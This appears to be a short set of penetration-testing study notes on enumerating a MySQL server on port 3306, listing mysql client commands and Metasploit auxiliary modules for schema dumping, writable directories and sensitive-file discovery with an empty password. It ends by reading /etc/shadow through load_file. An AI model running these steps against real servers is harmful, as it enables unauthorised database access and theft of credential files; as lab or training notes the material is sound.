MySQL is a database service that usually runs in port 3306.
To connect to MySQL, use the following command
-mysql -h <target_ip> -u <user>
showing databses available
-show databases;
To select a database
-use <databse>;
To find total values from a table
-select count(*) from <table>;
Dump the schema of all databases from the server using suitable metasploit module
-use auxiliary/scanner/mysql/mysql_schemadump
Finding writeable directories
-use auxiliary/scanner/mysql/mysql_writable_dirs
-set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
To set the password empty
-set PASSWORD ""
Finding sensitive files with METASPLOIT
-use auxiliary/scanner/mysql/mysql_file_enum
-set FILE_LIST /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt

After finding a sensitive file, we can load it with the mysql command. For example. lets pretend we found that the etc/shadow file is sensitive. 
First, we connect
-mysql -h <target_ip> -u <user>
Then, we load the file
-select load_file("/etc/shadow");
